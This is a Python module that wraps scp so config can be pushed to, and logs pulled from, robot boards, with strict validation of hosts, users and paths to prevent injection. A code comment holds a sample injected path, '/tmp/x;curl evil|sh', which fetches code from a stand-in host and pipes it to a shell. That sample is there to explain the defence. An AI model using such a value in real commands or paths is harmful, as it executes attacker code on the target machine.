"""Robot filesystem over scp (LB-03): push config, pull logs — Jetson/Pi targets.

Subprocess rules (CLAUDE.md §7): argument lists only, the scp binary pinned at
construction, `BatchMode=yes` so a missing key fails instead of prompting, a `--`
separator so no path can ever be parsed as a flag, and host/user/path validation
before anything is exec'd. The exec seam is injectable, so tests assert the exact
argv without a network.
"""

import asyncio
import re
from collections.abc import Awaitable, Callable
from pathlib import Path
from typing import Final

_HOST_RE: Final = re.compile(r"^[A-Za-z0-9._-]+$")
_USER_RE: Final = re.compile(r"^[A-Za-z0-9._-]+$")
#: Remote paths are handed to the ROBOT'S SHELL by legacy-protocol scp (OpenSSH < 9,
#: or `-O`). The `--` argv separator only protects LOCAL parsing — this allowlist is
#: what stops `/tmp/x;curl evil|sh` executing on the robot (§7 remote injection).
_REMOTE_PATH_RE: Final = re.compile(r"^[A-Za-z0-9._/-]+$")
_EXEC_TIMEOUT_SECONDS: Final = 300.0

ExecFn = Callable[[list[str]], Awaitable[tuple[int, str]]]


async def _run_subprocess(argv: list[str]) -> tuple[int, str]:
    process = await asyncio.create_subprocess_exec(
        *argv, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT
    )
    try:
        output, _ = await asyncio.wait_for(process.communicate(), timeout=_EXEC_TIMEOUT_SECONDS)
    except TimeoutError:
        process.kill()
        await process.wait()
        raise RuntimeError("scp timed out") from None
    return process.returncode or 0, output.decode(errors="replace")


def _safe_remote_path(path: str) -> str:
    # Reject anything a remote shell could expand: ; $ ` & | * ~ whitespace, and a
    # leading '-' (a flag to scp itself).
    if not _REMOTE_PATH_RE.match(path):
        raise ValueError(f"remote path contains shell-unsafe characters or a flag: {path!r}")
    return path


class SshFilesystem:
    """scp-backed push/pull against one robot."""

    def __init__(
        self,
        *,
        host: str,
        user: str,
        scp_binary: str,
        execute: ExecFn | None = None,
    ) -> None:
        if not _HOST_RE.match(host):
            raise ValueError(f"invalid host: {host!r}")
        if not _USER_RE.match(user):
            raise ValueError(f"invalid user: {user!r}")
        self._target = f"{user}@{host}"
        self._binary = scp_binary
        self._execute = execute or _run_subprocess

    def _argv(self, source: str, dest: str) -> list[str]:
        return [self._binary, "-o", "BatchMode=yes", "--", source, dest]

    async def push(self, local: Path, remote: str) -> None:
        """Upload one local file to the robot (push config, deploy assets)."""
        remote = _safe_remote_path(remote)
        code, output = await self._execute(self._argv(str(local), f"{self._target}:{remote}"))
        if code != 0:
            raise RuntimeError(f"scp push failed ({code}): {output.strip()[:500]}")

    async def pull(self, remote: str, local: Path) -> None:
        """Download one file from the robot (pull logs, captured data)."""
        remote = _safe_remote_path(remote)
        code, output = await self._execute(self._argv(f"{self._target}:{remote}", str(local)))
        if code != 0:
            raise RuntimeError(f"scp pull failed ({code}): {output.strip()[:500]}")
